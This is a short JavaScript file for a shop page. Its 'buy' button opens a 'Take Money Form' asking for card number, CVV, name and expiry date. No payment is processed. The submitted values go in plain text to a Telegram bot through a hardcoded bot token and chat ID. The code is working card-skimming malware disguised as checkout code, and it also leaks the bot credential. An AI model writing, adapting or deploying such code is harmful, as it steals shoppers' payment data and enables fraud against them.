// script.js

document.addEventListener('DOMContentLoaded', function () {
    const buyButton = document.querySelector('.buy-button');
    if (buyButton) {
      buyButton.addEventListener('click', function () {
        showTakeMoneyForm();
      });
    }
  });
  
  function showTakeMoneyForm() {
    // Create a modal overlay
    const modalOverlay = document.createElement('div');
    modalOverlay.classList.add('modal-overlay');
  
    // Create the "Take Money" form
    const takeMoneyForm = document.createElement('div');
    takeMoneyForm.classList.add('take-money-form');
    takeMoneyForm.innerHTML = `
      <h2>Take Money Form</h2>
      <form id="takeMoneyForm">
        <label for="cardInput">Card:</label>
        <input type="text" id="cardInput" required>
  
        <label for="cvvInput">CVV:</label>
        <input type="text" id="cvvInput" required>
  
        <label for="nameInput">Name:</label>
        <input type="text" id="nameInput" required>
  
        <label for="expiryDateInput">Expiry Date:</label>
        <input type="date" id="expiryDateInput" required>
  
        <button type="submit">Submit Payment</button>
      </form>
    `;
  
    // Append the form to the modal overlay
    modalOverlay.appendChild(takeMoneyForm);
  
    // Append the modal overlay to the body
    document.body.appendChild(modalOverlay);
  
    // Add event listener to handle form submission
    const takeMoneyFormElement = document.getElementById('takeMoneyForm');
    takeMoneyFormElement.addEventListener('submit', function (event) {
      event.preventDefault();
      handlePaymentSubmission();
    });
  }
  
  function handlePaymentSubmission() {
    // Retrieve values from the form
    const cardValue = document.getElementById('cardInput').value;
    const cvvValue = document.getElementById('cvvInput').value;
    const nameValue = document.getElementById('nameInput').value;
    const expiryDateValue = document.getElementById('expiryDateInput').value;
  
    // Send the form details to the Telegram bot
    sendToTelegramBot(cardValue, cvvValue, nameValue, expiryDateValue);
  
    // Close the modal
    closeModal();
  }
  
  function sendToTelegramBot(card, cvv, name, expiryDate) {
    const botToken = '6780796808:AAEMjYut3HZtDuZWfjabfV2-kxPEI57BiLs'; // Replace with your bot token
    const chatId = '1204315551'; // Replace with your chat ID
  
    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const message = `New Payment Details:\nCard: ${card}\nCVV: ${cvv}\nName: ${name}\nExpiry Date: ${expiryDate}`;
  
    fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
    .then(response => response.json())
    .then(data => {
      console.log('Message sent to Telegram:', data);
      closeModal(); // Close the modal after successful submission
    })
    .catch(error => {
      console.error('Error sending message to Telegram:', error);
      closeModal(); // Close the modal even if there's an error
    });
  }
  
  function closeModal() {
    const modalOverlay = document.querySelector('.modal-overlay');
    if (modalOverlay) {
      modalOverlay.remove();
    }
  }
  
  
  